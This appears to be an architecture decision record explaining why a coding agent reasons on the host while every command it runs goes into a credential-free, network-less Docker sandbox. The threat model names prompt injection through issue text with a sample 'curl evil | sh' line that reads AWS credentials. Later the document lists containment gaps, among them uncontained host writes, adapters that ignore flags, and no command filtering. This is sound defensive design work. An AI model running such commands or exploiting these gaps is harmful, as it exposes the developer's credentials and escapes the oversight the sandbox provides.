---
title: "ADR 0002: Agent on the host, its commands in the sandbox"
type: adr
summary: Why the agent reasons and edits files on the host while every command it runs is docker-exec'd into a credential-free box via an MCP tool — and why credentialed effects stay in the orchestrator.
sources:
  - kontinuum/agent.py
  - kontinuum/sandbox.py
  - kontinuum/sandbox_mcp.py
  - kontinuum/effects.py
last_verified:
  date: 2026-08-16
  sha: seed
related: [subsystems/sandbox, subsystems/agent-seam]
---

## Context

Issue text is attacker-influenceable and K executes whatever the agent decides to run. Three options were on the table:

1. Run commands on the host — an injected `curl evil | sh` reads `~/.aws/credentials` and the Claude login. Rejected.
2. Run the whole agent inside the container — the box then needs the agent's credential and network egress to reach the model API, which is exactly what containment was supposed to remove.
3. Split them: agent on the host, commands in the box.

## Decision

**Option 3.** The agent process runs on the host with the developer's Claude login; the *only* way it can run a command is the `run` tool of a stdio MCP server that `docker exec`s into the task's container (`kontinuum/sandbox_mcp.py:30`, wired in `kontinuum/agent.py:99`). Its host tools are limited to `Read`/`Edit`/`Write` plus that one MCP tool, with `Bash` explicitly disallowed (`kontinuum/agent.py:110`).

The container is credential-free by construction: no host env is forwarded, `--network none`, `--cap-drop ALL`, `no-new-privileges`, and only the worktree is mounted at `/work` (`kontinuum/sandbox.py:27`). It runs as the host uid so bind-mount writes still work without container root (`kontinuum/sandbox.py:29`).

**Companion rule:** credentialed effects live only in the orchestrator. `gh`/`git` push, PR creation, comments and labels happen in `kontinuum/effects.py:37`, after `scan_diff` (`kontinuum/effects.py:24`). The agent produces a diff — data, not effects. There is no `gh` on the agent's side of the line, and nothing in the box could authenticate anyway.

## Consequences

- The login never enters the container, and the container never needs egress to talk to the model.
- The boundary is the sandbox, not the CLI flags. `--disallowedTools Bash` keeps a well-behaved adapter on its contract; it is a convenience. Written out in the `agent.py` module docstring (`kontinuum/agent.py:14`).
- `--strict-mcp-config` (`kontinuum/agent.py:110`) is load-bearing: without it the agent would inherit the developer's own configured MCP servers, several of which carry credentials.
- Backends are swappable behind `AgentRunner` (`kontinuum/agent.py:53`) without touching containment, because containment lives in `Sandbox`, not in the adapter.
- One persistent container per attempt (`start`/`exec`/`stop`, `kontinuum/sandbox.py:41`) so state — installed deps, build caches — survives across the agent's commands; torn down in a `finally` (`kontinuum/agent.py:118`).

## Costs and limits (honest)

- **The agent can write anything into the worktree.** `Edit`/`Write` run on the *host* with `--permission-mode acceptEdits`. Nothing enforces worktree scoping — that is the CLI's own cwd behaviour, not K's. Host file writes are **not** contained. The backstops are the gate, `scan_diff`, and human PR review.
- **A backend that ignores the flags escapes.** The adapter process inherits K's env, which on a headless install holds `ANTHROPIC_API_KEY`. Run K with no other secrets in the host env, and register only trusted adapters. Boxing an untrusted adapter's own process is deferred (§16 trust tiers).
- **The setup step deliberately runs WITH network.** `kontinuum/loop.py:125` runs `recipe.setup` in a `"bridge"` sandbox before the agent starts, so `npm ci` / `pip install` can work. It is repo-authored and deterministic; the agent and gate then run offline (`kontinuum/loop.py:140`, default `network: "none"` at `kontinuum/recipe.py:24`).
- **The recipe image is trusted, not verified.** `image`/`setup`/`gate` come from the repo's `.kontinuum/verify.yaml` (`kontinuum/recipe.py:27`), which a human reviewed and merged via the onboarding PR (`kontinuum/loop.py:281`). A hostile image would have the worktree bind-mounted and, during setup, network. Trust here is a human decision, not a control.
- **No command filtering.** The MCP tool hands the string to `sh -c` verbatim (`kontinuum/sandbox_mcp.py:35`). Intentional: the box is the boundary, an allowlist would only be a second, leakier one. Commands are capped at 600s.
- **The docs pass has no sandbox at all** (`kontinuum/agent.py:121`) — it runs no commands, so there is nothing to contain; `Bash` stays disallowed and that propagates to the sub-agents it dispatches.

## See also

- `docs/kontinuum-mvp.md` §2 decision 2, §3 "The security split", §8 "Where the boundary is".
- `tests/test_sandbox_mcp.py` — protocol shape only; the docker-exec path is covered by a live spike, not by unit tests.
